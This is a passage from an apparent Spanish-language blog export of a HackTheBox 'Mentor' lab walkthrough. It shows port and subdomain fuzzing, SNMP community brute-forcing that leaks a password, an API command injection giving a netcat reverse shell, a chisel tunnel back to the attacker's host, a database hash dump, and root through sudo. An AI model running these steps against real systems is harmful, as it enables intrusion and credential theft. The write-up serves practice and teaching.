            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"bash\",\"code\":\"> nmap -p- -sCV -vvv --min-rate 5000 -oG allPorts 10.10.11.193\\n\\n[*] Open ports: 22, 80\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> nmap -p22,80 -vvv -sCV -oN targeted 10.10.11.193\\n\\n# Output\\nPORT   STATE SERVICE REASON  VERSION\\n22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey: \\n|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)\\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=\\n|   256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)\\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv\\n80/tcp open  http    syn-ack Apache httpd 2.4.52\\n|_http-title: Did not follow redirect to http://mentorquotes.htb/\\n| http-methods: \\n|_  Supported Methods: GET HEAD POST OPTIONS\\n|_http-server-header: Apache/2.4.52 (Ubuntu)\\nService Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\"}],[\"code\",{\"language\":\"bash\",\"code\":\"# /etc/hosts\\n# Host addresses\\n127.0.0.1  localhost\\n127.0.1.1  parrot\\n::1        localhost ip6-localhost ip6-loopback\\nff02::1    ip6-allnodes\\nff02::2    ip6-allrouters\\n# Others\\n10.10.11.193   mentorquotes.htb\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image-6.png\",\"width\":711,\"height\":531,\"caption\":\"mentorquotes.htb\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> whatweb mentorquotes.htb\\nhttp://mentorquotes.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.3 Python/3.6.9], IP[10.10.11.193], Python[3.6.9], Title[MentorQuotes], Werkzeug[2.0.3]\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> wfuzz -c --hc=302 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \\\"Host: FUZZ.mentorquotes.htb\\\" mentorquotes.htb\\n\\n# Output\\n===============================================================\\nID           Response   Lines    Word       Chars       Payload\\n===============================================================\\n000000051:   404        0 L      2 W        22 Ch       \\\"api\\\"\"}],[\"code\",{\"language\":\"bash\",\"code\":\"# /etc/hosts\\n# Host addresses\\n127.0.0.1  localhost\\n127.0.1.1  parrot\\n::1        localhost ip6-localhost ip6-loopback\\nff02::1    ip6-allnodes\\nff02::2    ip6-allrouters\\n# Others\\n10.10.11.193   mentorquotes.htb     api.mentorquotes.htb\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> curl -I api.mentorquotes.htb\\nHTTP/1.1 404 Not Found\\nDate: Fri, 30 Dec 2022 19:05:13 GMT\\nServer: uvicorn\\ncontent-length: 22\\ncontent-type: application/json\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/Untitled-2022-12-30-2011.svg\",\"width\":1064,\"height\":348,\"caption\":\"Server schema\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> wfuzz -c --hc=404,302 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \\\"Host: api.mentorquotes.htb\\\" mentorquotes.htb/FUZZ\\n\\n# Output\\n================================================================\\nID           Response   Lines    Word       Chars       Payload\\n================================================================\\n000000150:   200        30 L     62 W       969 Ch      \\\"docs\\\" \\n000000024:   307        0 L      0 W        0 Ch        \\\"admin\\\" \\n000000646:   307        0 L      0 W        0 Ch        \\\"users\\\"\\n000002314:   307        0 L      0 W        0 Ch        \\\"quotes\\\"\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image-7.png\",\"width\":961,\"height\":430}],[\"code\",{\"language\":\"bash\",\"code\":\"> sudo nmap -p161 -sU 10.10.11.193\\nPORT    STATE SERVICE\\n161/udp open  snmp\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> python snmpbrute.py -t 10.10.11.193\\n   _____ _   ____  _______     ____             __     \\n  / ___// | / /  |/  / __ \\\\   / __ )_______  __/ /____ \\n  \\\\__ \\\\/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \\\\\\n ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/\\n/____/_/ |_/_/  /_/_/      /_____/_/   \\\\__,_/\\\\__/\\\\___/ \\n\\nSNMP Bruteforce & Enumeration Script v2.0\\nhttp://www.secforce.com / nikos.vassakis <at> secforce.com\\n###############################################################\\n10.10.11.193 : 161 \\tVersion (v2c):\\tinternal\\n10.10.11.193 : 161 \\tVersion (v1):\\tpublic\\n10.10.11.193 : 161 \\tVersion (v2c):\\tpublic\\n10.10.11.193 : 161 \\tVersion (v1):\\tpublic\\n10.10.11.193 : 161 \\tVersion (v2c):\\tpublic\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> snmpwalk -v2c -c internal 10.10.11.193 | tee snmpwalk.log\"}],[\"code\",{\"language\":\"bash\",\"code\":\"iso.3.6.1.2.1.25.4.2.1.5.2126 = STRING: \\\"/usr/local/bin/login.py kj2xxxxxxxxxxxxxx\\\"\"}],[\"code\",{\"language\":\"bash\",\"code\":\"curl -X 'POST' \\\\\\n  'http://api.mentorquotes.htb/auth/login' \\\\\\n  -H 'accept: application/json' \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\n  \\\"email\\\": \\\"james@mentorquotes.htb\\\",\\n  \\\"username\\\": \\\"james\\\",\\n  \\\"password\\\": \\\"kj23sadkj123as0-d213\\\"\\n}'\\n\\n# Output\\n\\\"eyJxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\\\"%\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image-8.png\",\"width\":784,\"height\":512,\"caption\":\"Captura de Burpsuite/Repeater\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image-9.png\",\"width\":441,\"height\":399,\"caption\":\"Captura de Burpsuite/Repeater\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/image-10.png\",\"width\":691,\"height\":600,\"caption\":\"Captura de Burpsuite con la Reverse Shell\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> sudo nc -lvnp 1234\\nlistening on [any] 1234 ...\\nconnect to [10.10.14.88] from (UNKNOWN) [10.10.11.193] 34881\\nsh: can't access tty; job control turned off\\n/app # whoami\\nroot\\n/app # cat /home/svc/user.txt\\n3eaXXXXXXXXXXXXXXXXXXXXXXXX\"}],[\"code\",{\"language\":\"py\",\"code\":\"DATABASE_URL = os.getenv(\\\"DATABASE_URL\\\", \\\"postgresql://postgres:postgres@172.22.0.1/mentorquotes_db\\\")\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/12/Untitled-2022-12-30-2011-1.svg\",\"width\":1064,\"height\":461,\"caption\":\"Pivoting example\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> chisel server -p 1234 --reverse\\n2022/12/30 23:13:54 server: Reverse tunnelling enabled\\n2022/12/30 23:13:54 server: Fingerprint Y7dAMONRX/NODc3O0jqzg1tBqi8OKrLrLIItmMkAJoc=\\n2022/12/30 23:13:54 server: Listening on http://0.0.0.0:1234\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> chisel client 10.10.14.88:1234 R:5431:172.22.0.1:5432\\n2022/12/30 22:16:41 client: Connecting to ws://10.10.14.88:1234\\n2022/12/30 22:16:41 client: Connected (Latency 104.066799ms)\\n\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> psql -h localhost -d mentorquotes_db -U postgres -p 5431\\nmentorquotes_db=# \\\\dt\\n          List of relations\\n Schema |   Name   | Type  |  Owner   \\n--------+----------+-------+----------\\n public | cmd_exec | table | postgres\\n public | quotes   | table | postgres\\n public | users    | table | postgres\\n(3 rows)\\n\\nmentorquotes_db=# select * from users;\\n id |         email          |  username   |             password             \\n----+------------------------+-------------+----------------------------------\\n  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503\\n  2 | svc@mentorquotes.htb   | service_acc | 53fxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\\n(3 rows)\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> sshpass -p 123meunomeeivani ssh svc@10.10.11.193\\nsvc@mentor:~$ whoami\\nsvc\\nsvc@mentor:~$ id\\nuid=1001(svc) gid=1001(svc) groups=1001(svc)\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> cat /etc/snmp/snmpd.conf\\n...\\ncreateUser bootstrap MD5 SuperSecurePassword123__ DES\\n...\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> su - james\\nPassword: \\njames@mentor:~$ whoami\\njames\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> sudo -l\\n[sudo] password for james: \\nMatching Defaults entries for james on mentor:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin, use_pty\\n\\nUser james may run the following commands on mentor:\\n    (ALL) /bin/sh\"}],[\"code\",{\"language\":\"bash\",\"code\":\"> james@mentor:~$ sudo /bin/sh\\n# whoami\\nroot\\n# cat /root/root.txt\\ne01xxxxxxxxxxxxxxxxx\\n\"}]],\"markups\":[[\"em\"],[\"a\",[\"href\",\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug\"]],[\"strong\"],[\"a\",[\"href\",\"https://github.com/jpillora/chisel\"]],[\"a\",[\"href\",\"https://crackstation.net/\"]]],\"sections\":[[1,\"h2\",[[0,[],0,\"Fase de enumeración\"]]],[1,\"p\",[[0,[],0,\"Realizamos un escaneo completo de puertos con NMAP.\"]]],[10,0],[1,\"p\",[[0,[],0,\"Y apuntamos concretamente a los puertos 22 y 80, con tal de sacar más información que nos pueda ser útil.\"]]],[10,1],[1,\"p\",[[0,[],0,\"Aquí ya vemos cosas interesantes. El servidor detrás del puerto 80, redirige peticiones a \"],[0,[0],1,\"mentorquotes.htb\"],[0,[],0,\", por lo que modificaremos nuestro archivo hosts con tal de poder resolver dicho dominio cuando llamemos al servidor Apache.\"]]],[10,2],[1,\"p\",[[0,[],0,\"Abrimos Firefox, y accedemos a la url:\"]]],[10,3],[1,\"p\",[[0,[],0,\"En esta página no hay mucho que ver. Con \"],[0,[0],1,\"whatweb \"],[0,[],0,\"extraemos la siguiente información:\"]]],[10,4],[1,\"p\",[[0,[0],1,\"Werkzeug\"],[0,[],0,\", es una librería muy común de Frameworks de \"],[0,[0],1,\"Python \"],[0,[],0,\"como \"],[0,[0],1,\"Flask \"],[0,[],0,\"y \"],[0,[0],1,\"Django\"],[0,[],0,\". Una primera aproximación es ver si está el modo \"],[0,[0],1,\"debug \"],[0,[],0,\"activo accediendo a la URL \"],[0,[0],1,\"/console \"],[0,[],0,\"como explican \"],[0,[1],1,\"aquí\"],[0,[],0,\". No tenemos tanta suerte por el momento, a sí que lo próximo es aplicar fuzzing en busca de subdominios desconocidos.\"]]],[1,\"h2\",[[0,[],0,\"Enumeración Web\"]]],[10,5],[1,\"p\",[[0,[2],0,\"Importante destacar que en la llamada, NO estamos ocultando las peticiones 404 con el parametro \"],[0,[0],1,\"--hc\"],[0,[],1,\". Esto es porque los subdominios que no existen, en este caso, se redirigen siempre devolviendo un estado 302.\"]]],[1,\"p\",[[0,[],0,\"El resultado del fuzzing es que parece existir un subdominio \"],[0,[0],1,\"http://api.mentorquotes.htb\"],[0,[],0,\". Lo añadimos a nuestro \"],[0,[0],1,\"/etc/hosts.\"]]],[10,6],[1,\"p\",[[0,[],0,\"Aplicando un CURL, vemos lo siguiente:\"]]],[10,7],[1,\"p\",[[0,[],0,\"En este caso, es el propio servidor \"],[0,[0],1,\"Uvicorn \"],[0,[],0,\"el que está contestándonos. Parece ser que Apache está actuando de \"],[0,[0],1,\"Reverse Proxy\"],[0,[],0,\" cuando accedemos a ciertos dominios/subdominios.\"]]],[10,8],[1,\"p\",[[0,[],0,\"Repetimos el fuzzing contra el subdominio que acabamos de encontrar, a ver si hay alguna ruta oculta.\"]]],[10,9],[1,\"p\",[[0,[],0,\"Parece ser que estamos ante una API con Swagger.\"]]],[10,10],[1,\"p\",[[0,[],0,\"Además, encontramos a un usuario \"],[0,[0],1,\"james@mentorquotes.htb\"],[0,[],0,\". Podemos llegar a registrar un usuario, pero no podemos continuar por este camino.\"]]],[1,\"p\",[[0,[],0,\"Vamos a ver si \"],[0,[0],1,\"SNMP \"],[0,[],0,\"está funcionando en el servidor. Utilizaremos de nuevo \"],[0,[0],1,\"nmap \"],[0,[],0,\"con permisos de \"],[0,[0],1,\"sudo \"],[0,[],0,\"para poder utilizar el descubrimiento de puertos \"],[0,[0],1,\"UDP\"],[0,[],0,\".\"]]],[10,11],[1,\"h2\",[[0,[],0,\"Abusando de SNMP\"]]],[1,\"p\",[[0,[],0,\"SNMP puede funcionar bajo diferentes versiones. Utilizamos una herramienta de fuerza bruta para enumerar que versiones están disponibles en el servidor, así como las \"],[0,[0],1,\"community string\"],[0,[],0,\" que utilizan.\"]]],[10,12],[1,\"p\",[[0,[],0,\"La \"],[0,[0],1,\"community string public\"],[0,[],0,\" suele ser la que viene por defecto. Parece sospechosa la \"],[0,[0],1,\"internal \"],[0,[],0,\"que funciona bajo la versión \"],[0,[0],1,\"v2c\"],[0,[],0,\". Vamos a tirar por ahí.\"]]],[1,\"p\",[[0,[],0,\"Lanzamos el comando \"],[0,[0],1,\"snmpwalk \"],[0,[],0,\"durante unos minutos y almacenamos la salida del comando en un archivo para poderlo consultar posteriormente.\"]]],[10,13],[1,\"p\",[[0,[],0,\"El parámetro \"],[0,[0],1,\"-c\"],[0,[],0,\" es para establecer la cadena de comunidad con la que queremos escuchar. Normalmente, el valor es \"],[0,[0],1,\"public, pero \"],[0,[],0,\"en este caso, con \"],[0,[0],1,\"public \"],[0,[],0,\"no obtenemos ninguna información valiosa.\"]]],[1,\"p\",[[0,[],0,\"Cerca del final, encontramos la siguiente línea:\"]]],[10,14],[1,\"p\",[[0,[],0,\"Con ayuda de Swagger o directamente, con CURL, utilizamos esa contraseña que empieza por kj2... en uno de los endpoints de la API.\"]]],[10,15],[1,\"h2\",[[0,[],0,\"Explotación\"]]],[1,\"p\",[[0,[],0,\"Arrancamos \"],[0,[0],1,\"Burpsuite \"],[0,[],0,\"e interceptamos una petición hacia \"],[0,[0],1,\"http://api.mentorquotes.htb/admin\"],[0,[],0,\". Debemos incrustar el parámetro \"],[0,[0],1,\"Authorization \"],[0,[],0,\"junto con el \"],[0,[0],1,\"Token \"],[0,[],0,\"recogido en la petición anterior.\"]]],[10,16],[1,\"p\",[[0,[],0,\"Vemos que existen dos nuevos \"],[0,[0],1,\"endpoints\"],[0,[],0,\". \"],[0,[0],1,\"/check\"],[0,[],0,\" y \"],[0,[0],1,\"/backup\"],[0,[],0,\". Parece que el primero no funciona, y el segundo, solo funciona si la petición es de tipo POST. Además, el parámetro \"],[0,[0],1,\"Content-Type \"],[0,[],0,\"debe ser \"],[0,[0],1,\"application/json\"],[0,[],0,\" y espera recibir un diccionario del siguiente tipo: \"],[0,[0],1,\"{\\\"body\\\": \\\"xxx\\\", \\\"path\\\": \\\"xxx\\\"}.\"]]],[10,17],[1,\"p\",[[0,[],0,\"Según parece, el valor que dejas en el parámetro path es vulnerable a \"],[0,[0],1,\"RCE\"],[0,[],0,\". Escuchamos en el puerto 1234 con \"],[0,[0],1,\"Netcat \"],[0,[],0,\"y entablamos una reverse \"],[0,[0],1,\"shell\"],[0,[],0,\". Por un lado, tenemos lo siguiente:\"]]],[10,18],[1,\"p\",[[0,[],0,\"Y por el otro, entablamos la \"],[0,[0],1,\"shell\"],[0,[],0,\":\"]]],[10,19],[1,\"p\",[[0,[],0,\"Primera flag capturada. Tiene pinta que estamos dentro de un contenedor y que la próxima flag está fuera de él. Continuamos.\"]]],[1,\"p\",[[0,[],0,\"Investigando un poco los archivos, encontramos la siguiente información dentro un archivo \"],[0,[0],1,\"/app/app/db.py:\"]]],[10,20],[1,\"p\",[[0,[],0,\"Anotamos la información. Parece ser que hay una base de datos en el host, solamente accesible desde el contenedor.\"]]],[10,21],[1,\"p\",[[0,[],0,\"Con ayuda de \"],[0,[3,0],2,\"Chisel\"],[0,[],0,\", ejecutamos en nuestra máquina el siguiente comando:\"]]],[10,22],[1,\"p\",[[0,[],0,\"Y en la máquina objetivo:\"]]],[10,23],[1,\"p\",[[0,[],0,\"Una vez establecida la conexión, desde nuestra máquina podemos lanzar los comandos necesarios para interactuar con la base de datos de Postgresql.\"]]],[10,24],[1,\"p\",[[0,[],0,\"En \"],[0,[4],1,\"https://crackstation.net/\"],[0,[],0,\" podemos crackear el hash del password correspondiente al usuario service_acc.\"]]],[1,\"p\",[[0,[],0,\"Nos conectamos por \"],[0,[0],1,\"ssh \"],[0,[],0,\"a la máquina, esta vez ya sí directamente al host, y continuamos con el escalado de privilegios.\"]]],[10,25],[1,\"h2\",[[0,[],0,\"Escalada de privilegios\"]]],[1,\"p\",[[0,[],0,\"Retomando SNMP, vemos su archivo de configuración en /etc/snmp/snmpd.conf\"]]],[10,26],[1,\"p\",[[0,[],0,\"Probamos a logearnos al usuario james con esa contraseña.\"]]],[10,27],[1,\"p\",[[0,[],0,\"Pero seguimos sin ser root.\"]]],[1,\"p\",[[0,[],0,\"Vemos qué permisos de sudo tenemos\"]]],[10,28],[1,\"p\",[[0,[],0,\"Es decir, podemos ejecutar \"],[0,[0],1,\"/bin/sh \"],[0,[],0,\"como sudo.\"]]],[10,29],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<h2 id=\"fase-de-enumeraci%C3%B3n\">Fase de enumeración</h2><p>Realizamos un escaneo completo de puertos con NMAP.</p><pre><code class=\"language-bash\">&gt; nmap -p- -sCV -vvv --min-rate 5000 -oG allPorts 10.10.11.193\n\n[*] Open ports: 22, 80</code></pre><p>Y apuntamos concretamente a los puertos 22 y 80, con tal de sacar más información que nos pueda ser útil.</p><pre><code class=\"language-bash\">&gt; nmap -p22,80 -vvv -sCV -oN targeted 10.10.11.193\n\n# Output\nPORT   STATE SERVICE REASON  VERSION\n22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO6yWCATcj2UeU/SgSa+wK2fP5ixsrHb6pgufdO378n+BLNiDB6ljwm3U3PPdbdQqGZo1K7Tfsz+ejZj1nV80RY=\n|   256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjv9f3Jbxj42smHEXcChFPMNh1bqlAFHLi4Nr7w9fdv\n80/tcp open  http    syn-ack Apache httpd 2.4.52\n|_http-title: Did not follow redirect to http://mentorquotes.htb/\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.52 (Ubuntu)\nService Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre><p>Aquí ya vemos cosas interesantes. El servidor detrás del puerto 80, redirige peticiones a <em>mentorquotes.htb</em>, por lo que modificaremos nuestro archivo hosts con tal de poder resolver dicho dominio cuando llamemos al servidor Apache.</p><pre><code class=\"language-bash\"># /etc/hosts\n# Host addresses\n127.0.0.1  localhost\n127.0.1.1  parrot\n::1        localhost ip6-localhost ip6-loopback\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n# Others\n10.10.11.193   mentorquotes.htb</code></pre><p>Abrimos Firefox, y accedemos a la url:</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/12/image-6.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"711\" height=\"531\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/12/image-6.png 600w, __GHOST_URL__/content/images/2022/12/image-6.png 711w\"><figcaption>mentorquotes.htb</figcaption></figure><p>En esta página no hay mucho que ver. Con <em>whatweb </em>extraemos la siguiente información:</p><pre><code class=\"language-bash\">&gt; whatweb mentorquotes.htb\nhttp://mentorquotes.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.3 Python/3.6.9], IP[10.10.11.193], Python[3.6.9], Title[MentorQuotes], Werkzeug[2.0.3]</code></pre><p><em>Werkzeug</em>, es una librería muy común de Frameworks de <em>Python </em>como <em>Flask </em>y <em>Django</em>. Una primera aproximación es ver si está el modo <em>debug </em>activo accediendo a la URL <em>/console </em>como explican <a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug\">aquí</a>. No tenemos tanta suerte por el momento, a sí que lo próximo es aplicar fuzzing en busca de subdominios desconocidos.</p><h2 id=\"enumeraci%C3%B3n-web\">Enumeración Web</h2><pre><code class=\"language-bash\">&gt; wfuzz -c --hc=302 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.mentorquotes.htb\" mentorquotes.htb\n\n# Output\n===============================================================\nID           Response   Lines    Word       Chars       Payload\n===============================================================\n000000051:   404        0 L      2 W        22 Ch       \"api\"</code></pre><p><strong>Importante destacar que en la llamada, NO estamos ocultando las peticiones 404 con el parametro <em>--hc</em>. Esto es porque los subdominios que no existen, en este caso, se redirigen siempre devolviendo un estado 302.</strong></p><p>El resultado del fuzzing es que parece existir un subdominio <em>http://api.mentorquotes.htb</em>. Lo añadimos a nuestro <em>/etc/hosts.</em></p><pre><code class=\"language-bash\"># /etc/hosts\n# Host addresses\n127.0.0.1  localhost\n127.0.1.1  parrot\n::1        localhost ip6-localhost ip6-loopback\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n# Others\n10.10.11.193   mentorquotes.htb     api.mentorquotes.htb</code></pre><p>Aplicando un CURL, vemos lo siguiente:</p><pre><code class=\"language-bash\">&gt; curl -I api.mentorquotes.htb\nHTTP/1.1 404 Not Found\nDate: Fri, 30 Dec 2022 19:05:13 GMT\nServer: uvicorn\ncontent-length: 22\ncontent-type: application/json</code></pre><p>En este caso, es el propio servidor <em>Uvicorn </em>el que está contestándonos. Parece ser que Apache está actuando de <em>Reverse Proxy</em> cuando accedemos a ciertos dominios/subdominios.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/12/Untitled-2022-12-30-2011.svg\" class=\"kg-image\" alt loading=\"lazy\" width=\"1064\" height=\"348\"><figcaption>Server schema</figcaption></figure><p>Repetimos el fuzzing contra el subdominio que acabamos de encontrar, a ver si hay alguna ruta oculta.</p><pre><code class=\"language-bash\">&gt; wfuzz -c --hc=404,302 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: api.mentorquotes.htb\" mentorquotes.htb/FUZZ\n\n# Output\n================================================================\nID           Response   Lines    Word       Chars       Payload\n================================================================\n000000150:   200        30 L     62 W       969 Ch      \"docs\" \n000000024:   307        0 L      0 W        0 Ch        \"admin\" \n000000646:   307        0 L      0 W        0 Ch        \"users\"\n000002314:   307        0 L      0 W        0 Ch        \"quotes\"</code></pre><p>Parece ser que estamos ante una API con Swagger.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/12/image-7.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"961\" height=\"430\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/12/image-7.png 600w, __GHOST_URL__/content/images/2022/12/image-7.png 961w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Además, encontramos a un usuario <em>james@mentorquotes.htb</em>. Podemos llegar a registrar un usuario, pero no podemos continuar por este camino.</p><p>Vamos a ver si <em>SNMP </em>está funcionando en el servidor. Utilizaremos de nuevo <em>nmap </em>con permisos de <em>sudo </em>para poder utilizar el descubrimiento de puertos <em>UDP</em>.</p><pre><code class=\"language-bash\">&gt; sudo nmap -p161 -sU 10.10.11.193\nPORT    STATE SERVICE\n161/udp open  snmp</code></pre><h2 id=\"abusando-de-snmp\">Abusando de SNMP</h2><p>SNMP puede funcionar bajo diferentes versiones. Utilizamos una herramienta de fuerza bruta para enumerar que versiones están disponibles en el servidor, así como las <em>community string</em> que utilizan.</p><pre><code class=\"language-bash\">&gt; python snmpbrute.py -t 10.10.11.193\n   _____ _   ____  _______     ____             __     \n  / ___// | / /  |/  / __ \\   / __ )_______  __/ /____ \n  \\__ \\/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \\\n ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/\n/____/_/ |_/_/  /_/_/      /_____/_/   \\__,_/\\__/\\___/ \n\nSNMP Bruteforce &amp; Enumeration Script v2.0\nhttp://www.secforce.com / nikos.vassakis &lt;at&gt; secforce.com\n###############################################################\n10.10.11.193 : 161 \tVersion (v2c):\tinternal\n10.10.11.193 : 161 \tVersion (v1):\tpublic\n10.10.11.193 : 161 \tVersion (v2c):\tpublic\n10.10.11.193 : 161 \tVersion (v1):\tpublic\n10.10.11.193 : 161 \tVersion (v2c):\tpublic</code></pre><p>La <em>community string public</em> suele ser la que viene por defecto. Parece sospechosa la <em>internal </em>que funciona bajo la versión <em>v2c</em>. Vamos a tirar por ahí.</p><p>Lanzamos el comando <em>snmpwalk </em>durante unos minutos y almacenamos la salida del comando en un archivo para poderlo consultar posteriormente.</p><pre><code class=\"language-bash\">&gt; snmpwalk -v2c -c internal 10.10.11.193 | tee snmpwalk.log</code></pre><p>El parámetro <em>-c</em> es para establecer la cadena de comunidad con la que queremos escuchar. Normalmente, el valor es <em>public, pero </em>en este caso, con <em>public </em>no obtenemos ninguna información valiosa.</p><p>Cerca del final, encontramos la siguiente línea:</p><pre><code class=\"language-bash\">iso.3.6.1.2.1.25.4.2.1.5.2126 = STRING: \"/usr/local/bin/login.py kj2xxxxxxxxxxxxxx\"</code></pre><p>Con ayuda de Swagger o directamente, con CURL, utilizamos esa contraseña que empieza por kj2... en uno de los endpoints de la API.</p><pre><code class=\"language-bash\">curl -X 'POST' \\\n  'http://api.mentorquotes.htb/auth/login' \\\n  -H 'accept: application/json' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n  \"email\": \"james@mentorquotes.htb\",\n  \"username\": \"james\",\n  \"password\": \"kj23sadkj123as0-d213\"\n}'\n\n# Output\n\"eyJxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"%</code></pre><h2 id=\"explotaci%C3%B3n\">Explotación</h2><p>Arrancamos <em>Burpsuite </em>e interceptamos una petición hacia <em>http://api.mentorquotes.htb/admin</em>. Debemos incrustar el parámetro <em>Authorization </em>junto con el <em>Token </em>recogido en la petición anterior.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/12/image-8.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"784\" height=\"512\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/12/image-8.png 600w, __GHOST_URL__/content/images/2022/12/image-8.png 784w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Captura de Burpsuite/Repeater</figcaption></figure><p>Vemos que existen dos nuevos <em>endpoints</em>. <em>/check</em> y <em>/backup</em>. Parece que el primero no funciona, y el segundo, solo funciona si la petición es de tipo POST. Además, el parámetro <em>Content-Type </em>debe ser <em>application/json</em> y espera recibir un diccionario del siguiente tipo: <em>{\"body\": \"xxx\", \"path\": \"xxx\"}.</em></p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/12/image-9.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"441\" height=\"399\"><figcaption>Captura de Burpsuite/Repeater</figcaption></figure><p>Según parece, el valor que dejas en el parámetro path es vulnerable a <em>RCE</em>. Escuchamos en el puerto 1234 con <em>Netcat </em>y entablamos una reverse <em>shell</em>. Por un lado, tenemos lo siguiente:</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"__GHOST_URL__/content/images/2022/12/image-10.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"691\" height=\"600\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/12/image-10.png 600w, __GHOST_URL__/content/images/2022/12/image-10.png 691w\"><figcaption>Captura de Burpsuite con la Reverse Shell</figcaption></figure><p>Y por el otro, entablamos la <em>shell</em>:</p><pre><code class=\"language-bash\">&gt; sudo nc -lvnp 1234\nlistening on [any] 1234 ...\nconnect to [10.10.14.88] from (UNKNOWN) [10.10.11.193] 34881\nsh: can't access tty; job control turned off\n/app # whoami\nroot\n/app # cat /home/svc/user.txt\n3eaXXXXXXXXXXXXXXXXXXXXXXXX</code></pre><p>Primera flag capturada. Tiene pinta que estamos dentro de un contenedor y que la próxima flag está fuera de él. 